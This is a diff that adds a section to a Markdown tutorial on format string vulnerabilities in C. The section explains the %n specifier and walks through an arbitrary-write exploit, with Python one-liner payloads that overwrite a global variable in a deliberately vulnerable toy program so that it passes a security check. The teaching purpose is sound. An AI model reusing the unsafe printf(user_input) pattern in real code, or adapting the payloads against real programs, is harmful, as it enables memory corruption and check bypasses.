@@ -340,13 +340,142 @@ The junk characters come from the address we had provided to read from.
 
 #### Arbitrary Write Primitive
 
+Before we begin, we have to introduce another format specifier. The `%n`
+specifier writes the number of characters written so far to the address
+supplied. Here is an example of the specifier in action ([basic6.c][6]):
+
+```c
+$ cat basic6.c
+#include <stdio.h>
+
+int main() {
+    int count = 0;
+    printf("Show me what you got!%n\n", &count);
+    printf("Number of characters written: %d\n", count);
+}
+```
+
+Here is the run of the program:
+
+```console
+$ ./basic6
+Show me what you got!
+Number of characters written: 21
+```
+
+This lets us write values to anywhere we want since we have demonstrated that we
+can supply a pointer to be dereferenced in the previous section.
+
+For this demonstration, we will use this sample program ([basic7.c][7]).
+
+```c
+#include <stdio.h>
+
+int security_code;
+
+int main() {
+    security_code = 0;
+    printf("Security code address: 0x%x\n", &security_code);
+    go_customs();
+    printf("\nSecurity code: %x\n", security_code);
+    if (check_code()) {
+        puts("That isn't right... go to jail!");
+    }
+    else {
+        puts("All clear!");
+    }
+}
+
+int check_code() {
+    if (security_code == 42) {
+        return 0;
+    }
+    return 1;
+}
+
+void go_customs() {
+    fputs("Passport number: ", stdout);
+    char passport[501] = {0};
+    scanf("%500s", passport);
+    printf(passport);
+}
+```
+
+This program checks if the security code is equals to 42. If it is, it lets
+you through customs. It takes a 'passport number' but doesn't do anything to
+modify the value of the security code from the initial value of 0 so there is no
+legitimate way of setting it to 42. Let's take a look at a sample run:
+
+```console
+$ ./basic7
+Security code address: 0x804a038
+Passport number: 123456
+123456
+Security code: 0
+That isn't right... go to jail!
+```
+
+Now, let's detect the vulnerability:
+
+```console
+$ ./basic7
+Security code address: 0x804a038
+Passport number: AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.
+AAAAffcb29b7.11.f76c4e80.f76f39e9.4170e000.25414141.78252e78.2e78252e.252e7825.
+Security code: 0
+That isn't right... go to jail!
+```
+
+Let's try and write to the security code address:
+
+```console
+$ python -c 'import struct; print "X"+struct.pack("I", 0x804a038)+"%6$n"' |
+./basic7
+Security code address: 0x804a038
+Passport number: X8�
+Security code: 5
+That isn't right... go to jail!
+```
+
+Notice that the value of `security_code` actually changed. This is because we
+had 1 byte printed from the "X" to align the bytes in memory and 4 from the
+address we supplied. Now, we can increase that number by making the format
+string print more characters. We can do that with greater precision by using a
+width in the format specifier. We shall add a `%100x` to increase the number of
+characters printed.
+
+```console
+$ python -c 'import struct; print "X"+struct.pack("I", 0x804a038)+"%100x%6$n"' | ./basic7
+Security code address: 0x804a038
+Passport number: X8�                                                                                            ffa2b7f7
+Security code: 105
+That isn't right... go to jail!
+```
+
+Exactly 100 extra characters has been printed and exactly 100 has been added to
+the `security_code`. Therefore, we can force it to be 42 by performing the
+calculation: 42 - 5 = 37 and bypass the check!
+
+```console
+$ python -c 'import struct; print "X"+struct.pack("I", 0x804a038)+"%37x%6$n"' | ./basic7
+Security code address: 0x804a038
+Passport number: X8�                             ffb9f8f7
+Security code: 42
+All clear!
+```
+
+2. Integer Overflows and Underflows
+-----------------------------------
+
+
 [//]: # (Links)
 [1]: ./formatstring/basic1.c
 [2]: ./formatstring/basic2.c
 [3]: ./formatstring/basic3.c
 [4]: ./formatstring/basic4.c
 [5]: ./formatstring/basic5.c
-
+[6]: ./formatstring/basic6.c
+[7]: ./formatstring/basic7.c
 
 [//]: # (Images)
 [basic2stack]: ./images/basic2stack.png
